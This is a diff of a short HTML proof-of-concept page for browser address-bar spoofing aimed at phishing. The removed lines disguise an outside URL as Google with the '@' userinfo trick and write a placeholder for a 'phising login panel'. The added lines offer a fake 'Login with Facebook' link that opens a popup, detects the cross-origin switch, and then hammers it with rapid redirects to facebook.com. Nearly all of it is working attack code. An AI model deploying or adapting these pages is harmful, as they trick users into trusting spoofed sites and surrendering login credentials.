@@ -1,8 +1,22 @@
-<script>
-    function spoof() {
-        nWindow = window.open('https:/www.google.com@xnxrx.github.io/xnurx/threads.html');
-        nWindow.document.write('<body><pre>Here we could place a phising login panel</pre></body>');
-}
-</script>
-<input type="button" onclick="spoof()" value="PoC!">
-The page is being hosted in my server
+<html>
+	<head>
+		<script>
+			function next() {
+				w.location.replace('https://facebook.com/?'+n);
+				n++;
+
+				setTimeout("next();",15);
+				setTimeout("next();",25);
+			}
+
+			function f() {
+				w = window.open("content.html", "_blank", "width=500 height=500");
+				i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); n = 0; next(); }", 5);
+			}
+		</script>
+	</head>
+
+	<body>
+		<a href="#" onclick="f()">Login with Facebook</a>
+	</body>
+</html>
